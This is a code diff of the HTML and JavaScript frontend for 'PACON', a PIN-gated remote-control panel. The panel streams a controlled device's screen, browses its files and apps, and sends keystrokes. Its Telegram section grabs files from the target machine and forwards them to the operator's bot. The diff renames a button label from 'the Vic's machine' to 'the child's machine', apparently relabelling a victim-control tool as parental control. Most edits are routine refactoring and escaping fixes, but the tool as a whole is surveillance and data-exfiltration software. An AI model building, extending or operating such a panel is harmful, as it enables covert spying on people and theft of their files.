+            <input type="text" class="app-search" id="appSearch" placeholder="Search apps..." />
             <div class="app-drawer" id="appDrawer">
                 <div class="app-empty">Click <i class="fas fa-sync"></i> to load apps</div>
             </div>
         </div>
 
+        <!-- Agent Info -->
         <div class="control-panel">
             <h6><i class="fas fa-info-circle"></i> Agent Info</h6>
             <div class="agent-info" id="agentInfo">
@@ -683,6 +764,7 @@ body {
             </div>
         </div>
 
+        <!-- Telegram -->
         <div class="control-panel">
             <h6>
                 <i class="fab fa-telegram"></i> Telegram
@@ -692,20 +774,20 @@ body {
                 <input type="password" class="tg-input" id="tgBotToken" placeholder="Bot token (from @BotFather)" />
                 <input type="text" class="tg-input" id="tgChatId" placeholder="Chat ID (from @userinfobot)" />
                 <div style="display:flex;gap:6px;">
-                    <button class="btn-ctrl success" style="flex:1;font-size:10px;" onclick="tgSave()">
+                    <button class="btn-ctrl success" style="flex:1;font-size:10px;" id="btnTgSave">
                         <i class="fas fa-save"></i> Save
                     </button>
-                    <button class="btn-ctrl" style="flex:1;font-size:10px;" onclick="tgTest()">
+                    <button class="btn-ctrl" style="flex:1;font-size:10px;" id="btnTgTest">
                         <i class="fas fa-paper-plane"></i> Test
                     </button>
                 </div>
                 <div style="display:flex;gap:12px;align-items:center;margin-top:8px;padding:6px 8px;background:var(--bg-secondary);border-radius:6px;border:1px solid var(--border);">
                     <label class="tg-toggle-label">
-                        <input type="checkbox" id="tgNotifyOnline" checked onchange="tgSavePrefs()" />
+                        <input type="checkbox" id="tgNotifyOnline" checked />
                         <span style="color:#3fb950;font-weight:600;">🟢 Online</span>
                     </label>
                     <label class="tg-toggle-label">
-                        <input type="checkbox" id="tgNotifyOffline" checked onchange="tgSavePrefs()" />
+                        <input type="checkbox" id="tgNotifyOffline" checked />
                         <span style="color:#f85149;font-weight:600;">🔴 Offline</span>
                     </label>
                 </div>
@@ -714,41 +796,37 @@ body {
                     <div style="font-size:10px;font-weight:700;color:var(--text-secondary);letter-spacing:.5px;text-transform:uppercase;margin-bottom:6px;">
                         <i class="fas fa-paperclip"></i> Send Files
                     </div>
-
                     <div style="display:grid;grid-template-columns:1fr 1fr;gap:6px;margin-bottom:6px;">
-                        <button class="btn-ctrl" onclick="tgListAdminFiles()" title="List &amp; send admin-uploaded files">
+                        <button class="btn-ctrl" id="btnTgServerFiles" title="List &amp; send admin-uploaded files">
                             <i class="fas fa-hdd"></i> Server Files
                         </button>
-                        <button class="btn-ctrl" onclick="tgPickAndSendAdminFile()" title="Pick one file by name from server's files folder">
+                        <button class="btn-ctrl" id="btnTgPickAdmin" title="Pick one file by name from server's files folder">
                             <i class="fas fa-hand-pointer"></i> Pick File
                         </button>
                     </div>
-
                     <div style="display:grid;grid-template-columns:1fr 1fr;gap:6px;margin-bottom:6px;">
-                        <button class="btn-ctrl" onclick="tgSendAllReceivedToTelegram()" title="Send every received file to Telegram">
+                        <button class="btn-ctrl" id="btnTgAllReceived" title="Send every received file to Telegram">
                             <i class="fas fa-inbox"></i> Received
                         </button>
-                        <button class="btn-ctrl" onclick="tgPickAndSendReceivedFile()" title="Pick one received file by name">
+                        <button class="btn-ctrl" id="btnTgPickReceived" title="Pick one received file by name">
                             <i class="fas fa-hand-pointer"></i> Pick Recv
                         </button>
                     </div>
-
-                    <button class="btn-ctrl success" style="width:100%;font-size:10px;"
-                            onclick="tgGrabAndSendFromChild()"
-                            title="Grab a file from the Vic's machine and send it to Telegram">
+                    <button class="btn-ctrl success" style="width:100%;font-size:10px;" id="btnTgGrabChild" title="Grab a file from the child's machine and send it to Telegram">
                         <i class="fas fa-download"></i> Grab &amp; Send from Child
                     </button>
                 </div>
 
-                <button class="btn-ctrl" style="font-size:10px;margin-top:6px;" onclick="tgSendCustomText()">
+                <button class="btn-ctrl" style="font-size:10px;margin-top:6px;" id="btnTgCustom">
                     <i class="fas fa-comment"></i> Send Custom Message
                 </button>
             </div>
         </div>
 
+        <!-- Stream Quality -->
         <div class="control-panel">
             <h6><i class="fas fa-tachometer-alt"></i> Stream Quality</h6>
-            <select class="form-select form-select-sm" id="streamQuality" style="background: var(--bg-secondary); color: var(--text-primary); border: 1px solid var(--border); font-size: 11px;" onchange="rcSetQuality(this.value)">
+            <select class="form-select form-select-sm" id="streamQuality" style="background: var(--bg-secondary); color: var(--text-primary); border: 1px solid var(--border); font-size: 11px;">
                 <option value="500">High (2 FPS)</option>
                 <option value="1000" selected>Medium (1 FPS)</option>
                 <option value="2000">Low (0.5 FPS)</option>
@@ -759,90 +837,155 @@ body {
     </div>
 </div>
 
+<!-- ===== STICKY DEVICE ===== -->
 <div class="sticky-device offline" id="stickyDevice" style="display: none;">
     <div class="dot"></div>
     <span id="stickyDeviceText">—</span>
 </div>
 
+<!-- ===== LOG ===== -->
 <div class="rc-log" id="rcLog">
-    <div class="log-line info"><span class="time">[--:--:--]</span>PACON v1.2.11 initialized</div>
+    <div class="log-line info"><span class="time">[--:--:--]</span>PACON v1.2.12 initialized</div>
 </div>
-<button class="log-toggle" onclick="document.getElementById('rcLog').classList.toggle('collapsed')">
+<button class="log-toggle" id="logToggle">
     <i class="fas fa-chevron-down"></i>
 </button>
 
 <div id="toastContainer"></div>
 
 <script>
+/* ============================================================
+ * PACON REMOTE CONTROL v1.2.12 — Frontend
+ * ------------------------------------------------------------
+ * Design principles:
+ *   1. Geometry comes ONLY from the agent. Never invent sizes.
+ *   2. All dynamic HTML is rendered via textContent or escaped.
+ *   3. Event delegation — no inline onclick with injected paths.
+ *   4. Per-device state — no bleed across device switches.
+ * ============================================================ */
+
+'use strict';
+
 // ============================================================
-// GLOBAL STATE
+// STATE
 // ============================================================
 const API_URL = window.location.origin;
-let currentDeviceId        = null;
-let autoRefreshTimer       = null;
-let autoRefreshEnabled     = true;
-let currentRefreshInterval = 1000;
-let fpsCounter             = 0;
-let fpsTimestamp           = Date.now();
-let pressTimer             = null;
-let startPoint             = null;
-let isDragging             = false;
-let lastDeviceIdsHash      = '';
-let currentDeviceScreen    = null;   // FORCE-EXACT: per-device, null until agent reports
-let SESSION_TOKEN          = '';
-let clickCount             = 0;
-let lastClickTime          = 0;
-let currentZoom            = 1.0;
-let showHiddenFiles        = false;
-let currentAppList         = [];
-let appLoadInFlight        = false;
-let lastStatusPoll         = 0;
-let emptyDeviceListRetries = 0;
-let receivedFiles          = [];
 
-let liveTypingEnabled = false;
-let liveTypingBuffer  = '';
-let liveTypingTimer   = null;
+const state = {
+    currentDeviceId:        null,
+    autoRefreshEnabled:     true,
+    refreshInterval:        1000,
+    autoRefreshTimer:       null,
+    fpsCounter:             0,
+    fpsTimestamp:           Date.now(),
+    clickCount:             0,
+    lastClickTime:          0,
+    zoom:                   1.0,
+    showHiddenFiles:        false,
+    appList:                [],
+    appLoadInFlight:        false,
+    lastStatusPoll:         0,
+    receivedFiles:          [],
+    currentPath:            '',
+    lastDeviceIdsHash:      '',
+    emptyRetries:           0,
+    liveTyping:             false,
+    liveBuffer:             '',
+    liveTimer:              null,
+    authRecoveryInFlight:   false,
+    lastGeneratedLink:      '',
+    lastGeneratedLabel:     '',
+    blacksreenActive:       false,
+};
+
 const LIVE_TYPING_FLUSH_MS = 60;
 const LIVE_TYPING_MAX      = 500;
 
-const pendingCommands = new Map();
+// Per-device map: deviceId -> { screenSize, lastScreenshot, status, name, online }
 const deviceState = new Map();
+const pendingCommands = new Map();
 
+// Press/drag state for overlay
+let pressTimer = null;
+let startPoint = null;
+let isDragging = false;
+
+// ============================================================
+// PREFS
+// ============================================================
 const prefs = {
-    refreshInterval: 1000,
-    notifyOnline: true,
-    notifyOffline: true,
-    hiddenFiles: false,
+    refreshInterval:   1000,
+    hiddenFiles:       false,
     preferredDeviceId: '',
+    notifyOnline:      true,
+    notifyOffline:     true,
 };
 
 function loadPrefs() {
     try {
-        const saved = JSON.parse(localStorage.getItem('pacon.prefs') || '{}');
+        const saved = JSON.parse(localStorage.getItem('pacon.prefs.v12') || '{}');
         Object.assign(prefs, saved);
-        currentRefreshInterval = prefs.refreshInterval;
-        showHiddenFiles = prefs.hiddenFiles;
-    } catch (e) { /* ignore */ }
+        state.refreshInterval   = prefs.refreshInterval;
+        state.showHiddenFiles   = prefs.hiddenFiles;
+    } catch (_) { /* ignore */ }
 }
 function savePrefs() {
     try {
-        localStorage.setItem('pacon.prefs', JSON.stringify(prefs));
-    } catch (e) { /* ignore */ }
+        prefs.refreshInterval = state.refreshInterval;
+        prefs.hiddenFiles     = state.showHiddenFiles;
+        localStorage.setItem('pacon.prefs.v12', JSON.stringify(prefs));
+    } catch (_) { /* ignore */ }
 }
-
 loadPrefs();
 
 // ============================================================
-// TOASTS
+// UTILITIES
+// ============================================================
+function escapeHtml(s) {
+    return String(s ?? '')
+        .replace(/&/g, '&amp;')
+        .replace(/</g, '&lt;')
+        .replace(/>/g, '&gt;')
+        .replace(/"/g, '&quot;')
+        .replace(/'/g, '&#39;');
+}
+
+function formatBytes(n) {
+    if (!n || n < 0) return '';
+    if (n < 1024) return n + ' B';
+    if (n < 1024 * 1024) return (n / 1024).toFixed(1) + ' KB';
+    if (n < 1024 * 1024 * 1024) return (n / 1024 / 1024).toFixed(1) + ' MB';
+    return (n / 1024 / 1024 / 1024).toFixed(2) + ' GB';
+}
+
+function debounce(fn, ms) {
+    let t = null;
+    return function (...args) {
+        clearTimeout(t);
+        t = setTimeout(() => fn.apply(this, args), ms);
+    };
+}
+
+// ============================================================
+// TOAST
 // ============================================================
 function toast(msg, kind = 'info', duration = 4000) {
     const container = document.getElementById('toastContainer');
     if (!container) return;
     const el = document.createElement('div');
     el.className = 'toast ' + kind;
-    const iconMap = { success: 'fa-check-circle', error: 'fa-exclamation-circle', warn: 'fa-exclamation-triangle', info: 'fa-info-circle' };
-    el.innerHTML = `<i class="fas ${iconMap[kind] || iconMap.info}"></i><span>${escapeHtml(msg)}</span>`;
+    const iconMap = {
+        success: 'fa-check-circle',
+        error:   'fa-exclamation-circle',
+        warn:    'fa-exclamation-triangle',
+        info:    'fa-info-circle',
+    };
+    const icon = document.createElement('i');
+    icon.className = 'fas ' + (iconMap[kind] || iconMap.info);
+    const span = document.createElement('span');
+    span.textContent = msg;
+    el.appendChild(icon);
+    el.appendChild(span);
     container.appendChild(el);
     setTimeout(() => {
         el.style.opacity = '0';
@@ -852,129 +995,7 @@ function toast(msg, kind = 'info', duration = 4000) {
 }
 
 // ============================================================
-// PIN GATE
-// ============================================================
-function _pinInputs() { return document.querySelectorAll('.pin-inputs input'); }
-function pinAllFilled() { return Array.from(_pinInputs()).every(i => i.value.length === 1); }
-function pinValue() { return Array.from(_pinInputs()).map(i => i.value).join(''); }
-
-function pinClear(showError = false) {
-    _pinInputs().forEach(i => {
-        i.value = '';
-        i.classList.remove('filled');
-        if (showError) i.classList.add('error');
-    });
-    setTimeout(() => _pinInputs().forEach(i => i.classList.remove('error')), 500);
-    _pinInputs()[0]?.focus();
-    document.getElementById('pinSubmit').disabled = true;
-}
-
-function pinUpdateState() {
-    _pinInputs().forEach(i => {
-        if (i.value.length === 1) i.classList.add('filled');
-        else i.classList.remove('filled');
-    });
-    document.getElementById('pinSubmit').disabled = !pinAllFilled();
-}
-
-async function pinSubmit() {
-    const pin = pinValue();
-    if (pin.length !== 6) return;
-    const btn = document.getElementById('pinSubmit');
-    btn.disabled = true;
-    btn.textContent = 'Verifying...';
-    try {
-        const r = await fetch(API_URL + '/api/auth/login', {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            credentials: 'include',
-            body: JSON.stringify({ pin })
-        });
-        const data = await r.json();
-        if (r.ok && data.success) {
-            SESSION_TOKEN = 'cookie';
-            document.getElementById('pinGate').classList.add('hidden');
-            rcLog('✅ Unlocked', 'success');
-            toast('Welcome back', 'success', 2000);
-            rcBootAfterAuth();
-            return;
-        }
-        if (r.status === 429) {
-            document.getElementById('pinError').textContent = 'Too many attempts. Try again in 5 minutes.';
-        } else {
-            document.getElementById('pinError').textContent = data.error || 'Incorrect PIN';
-        }
-    } catch (e) {
-        document.getElementById('pinError').textContent = 'Server unreachable';
-    }
-    pinClear(true);
-    btn.textContent = 'Unlock';
-}
-
-function rcLogout() {
-    fetch(API_URL + '/api/auth/logout', { method: 'POST', credentials: 'include' });
-    SESSION_TOKEN = '';
-    location.reload();
-}
-
-document.addEventListener('DOMContentLoaded', () => {
-    const inputs = _pinInputs();
-    inputs.forEach((input, idx) => {
-        input.addEventListener('input', (e) => {
-            e.target.value = e.target.value.replace(/[^0-9]/g, '');
-            if (e.target.value.length === 1 && idx < 5) inputs[idx + 1].focus();
-            pinUpdateState();
-            if (pinAllFilled()) setTimeout(pinSubmit, 100);
-        });
-        input.addEventListener('keydown', (e) => {
-            if (e.key === 'Backspace' && !e.target.value && idx > 0) {
-                inputs[idx - 1].focus();
-                inputs[idx - 1].value = '';
-                pinUpdateState();
-                e.preventDefault();
-            }
-            if (e.key === 'Enter' && pinAllFilled()) pinSubmit();
-        });
-        input.addEventListener('paste', (e) => {
-            e.preventDefault();
-            const paste = (e.clipboardData || window.clipboardData).getData('text').replace(/\D/g, '').slice(0, 6);
-            for (let i = 0; i < 6; i++) inputs[i].value = paste[i] || '';
-            pinUpdateState();
-            if (pinAllFilled()) setTimeout(pinSubmit, 100);
-        });
-    });
-    document.getElementById('pinSubmit').addEventListener('click', pinSubmit);
-    rcCheckAuth();
-});
-
-async function rcCheckAuth() {
-    try {
-        const r = await fetch(API_URL + '/api/auth/status', { credentials: 'include' });
-        const data = await r.json();
-        if (!data.requires_pin) {
-            document.getElementById('pinGate').classList.add('hidden');
-            rcBootAfterAuth();
-            return;
-        }
-        if (data.has_session) {
-            const v = await fetch(API_URL + '/api/auth/verify', { credentials: 'include' });
-            if (v.ok) {
-                SESSION_TOKEN = 'cookie';
-                document.getElementById('pinGate').classList.add('hidden');
-                rcBootAfterAuth();
-                return;
-            }
-        }
-        document.getElementById('pinGate').classList.remove('hidden');
-        setTimeout(() => _pinInputs()[0]?.focus(), 200);
-    } catch (e) {
-        document.getElementById('pinGate').classList.remove('hidden');
-        document.getElementById('pinError').textContent = 'Server unreachable';
-    }
-}
-
-// ============================================================
-// LOGGING
+// LOG
 // ============================================================
 function rcLog(msg, cls = 'info') {
     const log = document.getElementById('rcLog');
@@ -982,43 +1003,49 @@ function rcLog(msg, cls = 'info') {
     const time = new Date().toLocaleTimeString('en-US', { hour12: false });
     const line = document.createElement('div');
     line.className = 'log-line ' + cls;
-    line.innerHTML = `<span class="time">[${time}]</span>${msg}`;
+    const tSpan = document.createElement('span');
+    tSpan.className = 'time';
+    tSpan.textContent = `[${time}]`;
+    line.appendChild(tSpan);
+    line.appendChild(document.createTextNode(msg));
     log.appendChild(line);
     while (log.children.length > 120) log.removeChild(log.firstChild);
     log.scrollTop = log.scrollHeight;
 }
-function rcClearLog() { document.getElementById('rcLog').innerHTML = ''; rcLog('Log cleared', 'info'); }
+function rcClearLog() {
+    document.getElementById('rcLog').innerHTML = '';
+    rcLog('Log cleared', 'info');
+}
 
 // ============================================================
 // API
 // ============================================================
-let authRecoveryInFlight = false;
-
 async function api(endpoint, method = 'GET', data = null) {
     try {
         const options = {
             method,
             headers: { 'Content-Type': 'application/json' },
-            credentials: 'include'
+            credentials: 'include',
         };
         if (data) options.body = JSON.stringify(data);
         const res = await fetch(API_URL + endpoint, options);
+
         if (res.status === 401) {
-            if (!authRecoveryInFlight) {
-                authRecoveryInFlight = true;
+            if (!state.authRecoveryInFlight) {
+                state.authRecoveryInFlight = true;
                 rcLog('🔒 Session expired — re-authenticating', 'warn');
                 toast('Session expired — please unlock again', 'warn');
                 setTimeout(() => {
                     document.getElementById('pinGate').classList.remove('hidden');
                     pinClear();
-                    authRecoveryInFlight = false;
+                    state.authRecoveryInFlight = false;
                 }, 500);
             }
             return null;
         }
         try {
             return await res.json();
-        } catch (e) {
+        } catch (_) {
             if (!res.ok) throw new Error('HTTP ' + res.status);
             return null;
         }
@@ -1032,11 +1059,11 @@ async function api(endpoint, method = 'GET', data = null) {
 // COMMAND SEND + RESULT TRACKING
 // ============================================================
 async function rcSendAndTrack(endpoint, body, label, options = {}) {
-    if (!currentDeviceId) {
+    if (!state.currentDeviceId) {
         toast('No device selected', 'warn');
         return null;
     }
-    const r = await api(endpoint, 'POST', { deviceId: currentDeviceId, ...body });
+    const r = await api(endpoint, 'POST', { deviceId: state.currentDeviceId, ...body });
 
     if (r && r.success === false && r.offline) {
         rcLog(`❌ ${label} — ${r.error}`, 'error');
@@ -1044,7 +1071,7 @@ async function rcSendAndTrack(endpoint, body, label, options = {}) {
         return null;
     }
     if (!r || !r.success || !r.id) {
-        const err = r && r.error ? r.error : 'queue failed';
+        const err = (r && r.error) ? r.error : 'queue failed';
         rcLog(`❌ ${label} — ${err}`, 'error');
         if (!options.silent) toast(`${label} — ${err}`, 'error');
         return null;
@@ -1066,7 +1093,7 @@ async function pollCommandResult(cmdId, attempts = 25, silentSuccess = false) {
             pendingCommands.delete(cmdId);
             if (r.ok) {
                 if (!silentSuccess) {
-                    rcLog(`✅ Command OK`, 'success');
+                    rcLog('✅ Command OK', 'success');
                     toast('Command succeeded', 'success', 2000);
                 }
             } else {
@@ -1083,6 +1110,130 @@ async function pollCommandResult(cmdId, attempts = 25, silentSuccess = false) {
 }
 
 // ============================================================
+// PIN GATE
+// ============================================================
+function _pinInputs() { return document.querySelectorAll('.pin-inputs input'); }
+function pinAllFilled() { return Array.from(_pinInputs()).every(i => i.value.length === 1); }
+function pinValue() { return Array.from(_pinInputs()).map(i => i.value).join(''); }
+
+function pinClear(showError = false) {
+    _pinInputs().forEach(i => {
+        i.value = '';
+        i.classList.remove('filled');
+        if (showError) i.classList.add('error');
+    });
+    setTimeout(() => _pinInputs().forEach(i => i.classList.remove('error')), 500);
+    const first = _pinInputs()[0];
+    if (first) first.focus();
+    const btn = document.getElementById('pinSubmit');
+    if (btn) btn.disabled = true;
+}
+
+function pinUpdateState() {
+    _pinInputs().forEach(i => {
+        if (i.value.length === 1) i.classList.add('filled');
+        else i.classList.remove('filled');
+    });
+    const btn = document.getElementById('pinSubmit');
+    if (btn) btn.disabled = !pinAllFilled();
+}
+
+async function pinSubmit() {
+    const pin = pinValue();
+    if (pin.length !== 6) return;
+    const btn = document.getElementById('pinSubmit');
+    btn.disabled = true;
+    btn.textContent = 'Verifying...';
+    try {
+        const r = await fetch(API_URL + '/api/auth/login', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            credentials: 'include',
+            body: JSON.stringify({ pin }),
+        });
+        const data = await r.json();
+        if (r.ok && data.success) {
+            document.getElementById('pinGate').classList.add('hidden');
+            rcLog('✅ Unlocked', 'success');
+            toast('Welcome back', 'success', 2000);
+            rcBootAfterAuth();
+            return;
+        }
+        if (r.status === 429) {
+            document.getElementById('pinError').textContent =
+                'Too many attempts. Try again in 5 minutes.';
+        } else {
+            document.getElementById('pinError').textContent = data.error || 'Incorrect PIN';
+        }
+    } catch (_) {
+        document.getElementById('pinError').textContent = 'Server unreachable';
+    }
+    pinClear(true);
+    btn.textContent = 'Unlock';
+}
+
+function rcLogout() {
+    fetch(API_URL + '/api/auth/logout', { method: 'POST', credentials: 'include' });
+    location.reload();
+}
+
+function setupPinGate() {
+    const inputs = _pinInputs();
+    inputs.forEach((input, idx) => {
+        input.addEventListener('input', (e) => {
+            e.target.value = e.target.value.replace(/[^0-9]/g, '');
+            if (e.target.value.length === 1 && idx < 5) inputs[idx + 1].focus();
+            pinUpdateState();
+            if (pinAllFilled()) setTimeout(pinSubmit, 100);
+        });
+        input.addEventListener('keydown', (e) => {
+            if (e.key === 'Backspace' && !e.target.value && idx > 0) {
+                inputs[idx - 1].focus();
+                inputs[idx - 1].value = '';
+                pinUpdateState();
+                e.preventDefault();
+            }
+            if (e.key === 'Enter' && pinAllFilled()) pinSubmit();
+        });
+        input.addEventListener('paste', (e) => {
+            e.preventDefault();
+            const paste = (e.clipboardData || window.clipboardData)
+                .getData('text').replace(/\D/g, '').slice(0, 6);
+            for (let i = 0; i < 6; i++) inputs[i].value = paste[i] || '';
+            pinUpdateState();
+            if (pinAllFilled()) setTimeout(pinSubmit, 100);
+        });
+    });
+    document.getElementById('pinSubmit').addEventListener('click', pinSubmit);
+}
+
+async function rcCheckAuth() {
+    try {
+        const r = await fetch(API_URL + '/api/auth/status', { credentials: 'include' });
+        const data = await r.json();
+        if (!data.requires_pin) {
+            document.getElementById('pinGate').classList.add('hidden');
+            rcBootAfterAuth();
+            return;
+        }
+        if (data.has_session) {
+            const v = await fetch(API_URL + '/api/auth/verify', { credentials: 'include' });
+            if (v.ok) {
+                document.getElementById('pinGate').classList.add('hidden');
+                rcBootAfterAuth();
+                return;
+            }
+        }
+        document.getElementById('pinGate').classList.remove('hidden');
+        setTimeout(() => _pinInputs()[0]?.focus(), 200);
+    } catch (_) {
+        document.getElementById('pinGate').classList.remove('hidden');
+        const err = document.getElementById('pinError');
+        if (err) err.textContent = 'Server unreachable';
+    }
+}
+
+// ============================================================
 // DEVICE CLASSIFICATION
 // ============================================================
 function deviceStatus(d) {
@@ -1092,69 +1243,93 @@ function deviceStatus(d) {
 }
 
 // ============================================================
-// DEVICES
+// DEVICES — FETCH + RENDER
 // ============================================================
 async function rcRefreshDevices() {
     const data = await api('/api/devices');
     if (!data || !data.devices) {
-        if (emptyDeviceListRetries < 5) {
-            emptyDeviceListRetries++;
-            setTimeout(rcRefreshDevices, 1000 * emptyDeviceListRetries);
+        if (state.emptyRetries < 5) {
+            state.emptyRetries++;
+            setTimeout(rcRefreshDevices, 1000 * state.emptyRetries);
         }
         return;
     }
-    emptyDeviceListRetries = 0;
+    state.emptyRetries = 0;
 
     const devices = Object.values(data.devices);
-
     devices.sort((a, b) => {
-        const sa = deviceStatus(a) === 'online' ? 0 : deviceStatus(a) === 'pending' ? 1 : 2;
-        const sb = deviceStatus(b) === 'online' ? 0 : deviceStatus(b) === 'pending' ? 1 : 2;
+        const order = { online: 0, pending: 1, offline: 2 };
+        const sa = order[deviceStatus(a)] ?? 3;
+        const sb = order[deviceStatus(b)] ?? 3;
         if (sa !== sb) return sa - sb;
         return (a.name || '').localeCompare(b.name || '');
     });
 
-    const hash = devices.map(d => d.id + '|' + (d.last_poll_secs || '') + '|' + deviceStatus(d)).sort().join(',');
-    if (hash !== lastDeviceIdsHash) {
-        lastDeviceIdsHash = hash;
-        const select = document.getElementById('deviceSelect');
-        select.innerHTML = '<option value="">-- Select Device --</option>';
-        devices.forEach(d => {
-            const st = deviceStatus(d);
-            const opt = document.createElement('option');
-            opt.value = d.id;
-            const dot = st === 'online' ? '🟢' : st === 'pending' ? '🟡' : '⚪';
-            const tag = st === 'pending' ? ' [pending]' : '';
-            opt.textContent = `${dot} ${d.name || 'Unknown'} (${d.model || 'Device'})${tag}`;
-            select.appendChild(opt);
-        });
+    // Update select options only when device set changes
+    const hash = devices
+        .map(d => d.id + '|' + (d.last_poll_secs || '') + '|' + deviceStatus(d))
+        .sort()
+        .join(',');
 
-        if (devices.length === 0) {
-            currentDeviceId = null;
-            currentDeviceScreen = null;
-        } else {
-            const current = devices.find(d => d.id === currentDeviceId);
-            const currentIsOnline = current && deviceStatus(current) === 'online';
-            const preferred = devices.find(d => d.id === prefs.preferredDeviceId);
-            const preferredIsOnline = preferred && deviceStatus(preferred) === 'online';
-
-            if (currentIsOnline) {
-                select.value = currentDeviceId;
-            } else if (preferredIsOnline) {
-                rcLog(`🔄 Auto-switching to saved device ${preferred.name || preferred.id.substring(0,8)}`, 'info');
-                rcSelectDevice(preferred.id);
-            } else {
-                const firstOnline = devices.find(d => deviceStatus(d) === 'online');
-                const firstPending = devices.find(d => deviceStatus(d) === 'pending');
-                const target = firstOnline || firstPending || devices[0];
-                if (target.id !== currentDeviceId) {
-                    rcLog(`🔄 Auto-switching to ${target.name || target.id.substring(0,8)}`, 'info');
-                    rcSelectDevice(target.id);
-                }
-            }
-        }
+    if (hash !== state.lastDeviceIdsHash) {
+        state.lastDeviceIdsHash = hash;
+        _rebuildDeviceSelect(devices);
+        _handleAutoDeviceSelection(devices);
     }
 
+    _renderDeviceList(devices);
+
+    // Update pill state
+    const anyOnline  = devices.some(d => deviceStatus(d) === 'online');
+    const anyPending = devices.some(d => deviceStatus(d) === 'pending');
+    _updateStatusPill(devices.length > 0, anyOnline, anyPending);
+}
+
+function _rebuildDeviceSelect(devices) {
+    const select = document.getElementById('deviceSelect');
+    select.innerHTML = '<option value="">-- Select Device --</option>';
+    devices.forEach(d => {
+        const st = deviceStatus(d);
+                const dot = st === 'online' ? '🟢' : st === 'pending' ? '🟡' : '⚪';
+        const tag = st === 'pending' ? ' [pending]' : '';
+        const opt = document.createElement('option');
+        opt.value = d.id;
+        opt.textContent = `${dot} ${d.name || 'Unknown'} (${d.model || 'Device'})${tag}`;
+        select.appendChild(opt);
+    });
+}
+
+function _handleAutoDeviceSelection(devices) {
+    if (devices.length === 0) {
+        state.currentDeviceId = null;
+        _clearScreen();
+        return;
+    }
+
+    const current   = devices.find(d => d.id === state.currentDeviceId);
+    const currentOk = current && deviceStatus(current) === 'online';
+    const preferred = devices.find(d => d.id === prefs.preferredDeviceId);
+    const preferredOk = preferred && deviceStatus(preferred) === 'online';
+
+    if (currentOk) {
+        document.getElementById('deviceSelect').value = state.currentDeviceId;
+        return;
+    }
+    if (preferredOk) {
+        rcLog(`🔄 Auto-switching to saved device ${preferred.name || preferred.id.substring(0, 8)}`, 'info');
+        rcSelectDevice(preferred.id);
+        return;
+    }
+    const firstOnline  = devices.find(d => deviceStatus(d) === 'online');
+    const firstPending = devices.find(d => deviceStatus(d) === 'pending');
+    const target       = firstOnline || firstPending || devices[0];
+    if (target && target.id !== state.currentDeviceId) {
+        rcLog(`🔄 Auto-switching to ${target.name || target.id.substring(0, 8)}`, 'info');
+        rcSelectDevice(target.id);
+    }
+}
+
+function _renderDeviceList(devices) {
     const list = document.getElementById('deviceList');
     if (devices.length === 0) {
         list.innerHTML = `
@@ -1162,147 +1337,58 @@ async function rcRefreshDevices() {
                 No devices connected.<br>
                 <span style="font-size: 10px;">Waiting for the agent to register…</span>
             </div>`;
-    } else {
-        list.innerHTML = devices.map(d => {
-            const st = deviceStatus(d);
-            const active = d.id === currentDeviceId ? 'active' : '';
-            const shortId = escapeHtml((d.id || '').substring(0, 8));
-            let lastPoll = '—';
-            if (d.last_poll_secs !== undefined && d.last_poll_secs !== null) {
-                lastPoll = `${d.last_poll_secs}s ago`;
-            } else if (st === 'pending') {
-                lastPoll = 'registering';
-            }
-            return `
-                <div class="device-card ${active}" onclick="rcUserSelectDevice('${d.id}')">
-                    <div class="device-name">
-                        ${escapeHtml(d.name || 'Unknown')}
-                        <span class="device-badge ${st}">${st}</span>
-                    </div>
-                    <div class="device-model">${escapeHtml(d.model || 'Device')}</div>
-                    <div class="device-meta">
-                        <span class="device-id" onclick="event.stopPropagation();rcCopyDeviceId('${d.id}')" title="Click to copy">${shortId}</span>
-                        <span>${lastPoll}</span>
-                    </div>
-                </div>
-            `;
-        }).join('');
+        return;
     }
 
-    const anyOnline = devices.some(d => deviceStatus(d) === 'online');
-    const anyPending = devices.some(d => deviceStatus(d) === 'pending');
-    updateStatusPill(devices.length > 0, anyOnline, anyPending);
-}
+    // Build DOM safely — no innerHTML with user data
+    list.innerHTML = '';
+    devices.forEach(d => {
+        const st     = deviceStatus(d);
+        const active = d.id === state.currentDeviceId ? 'active' : '';
+        const shortId = (d.id || '').substring(0, 8);
 
-function rcUserSelectDevice(id) {
-    prefs.preferredDeviceId = id;
-    savePrefs();
-    rcSelectDevice(id);
-}
+        const card = document.createElement('div');
+        card.className = `device-card ${active}`;
+        card.dataset.deviceId = d.id;
 
-function rcCopyDeviceId(id) {
-    if (!id) return;
-    try {
-        navigator.clipboard.writeText(id);
-        toast('Device ID copied', 'success', 1500);
-    } catch (e) {
-        toast('Copy failed', 'warn', 1500);
-    }
-}
+        const nameEl = document.createElement('div');
+        nameEl.className = 'device-name';
+        nameEl.textContent = d.name || 'Unknown';
+        const badge = document.createElement('span');
+        badge.className = `device-badge ${st}`;
+        badge.textContent = st;
+        nameEl.appendChild(badge);
 
-function rcSelectDevice(id) {
-    if (!id || id === currentDeviceId) return;
-    currentDeviceId = id;
+        const modelEl = document.createElement('div');
+        modelEl.className = 'device-model';
+        modelEl.textContent = d.model || 'Device';
 
-    // FORCE-EXACT: wipe geometry until agent reports it for THIS device.
-    currentDeviceScreen = null;
-    const select = document.getElementById('deviceSelect');
-    if (select && select.value !== id) select.value = id;
-    document.querySelectorAll('.device-card').forEach(el => el.classList.remove('active'));
-    document.querySelectorAll('.device-card').forEach(el => {
-        if (el.getAttribute('onclick')?.includes(id)) el.classList.add('active');
-    });
-
-    const ds = deviceState.get(id) || {};
-    // Don't trust cached screenSize across device switches. Force fresh.
-    ds.screenSize = null;
-    deviceState.set(id, ds);
-
-    const drawer = document.getElementById('appDrawer');
-    drawer.innerHTML = '<div class="app-empty">Loading apps…</div>';
-    document.getElementById('appSearch').value = '';
-    currentAppList = [];
-
-    document.getElementById('rcFileList').innerHTML =
-        '<div style="color:var(--text-secondary);font-size:10px;padding:8px;text-align:center;">Enter a path and press Enter</div>';
-    document.getElementById('rcBreadcrumb').innerHTML =
-        '<span style="color:var(--text-secondary);font-size:10px;">No path yet</span>';
-
-    document.getElementById('screenLoading').classList.remove('hidden');
-    document.getElementById('screenLoadingText').textContent = 'Waiting for screen...';
-    document.getElementById('screenImg').src = '';
-    updateStickyDevice(id);
-    updateActionButtons();
-
-    rcLog('📱 Selected device: ' + id.substring(0, 12), 'success');
-
-    // FORCE-EXACT: pull geometry immediately, BEFORE the first click.
-    rcFetchScreenInfo(id).then(() => {
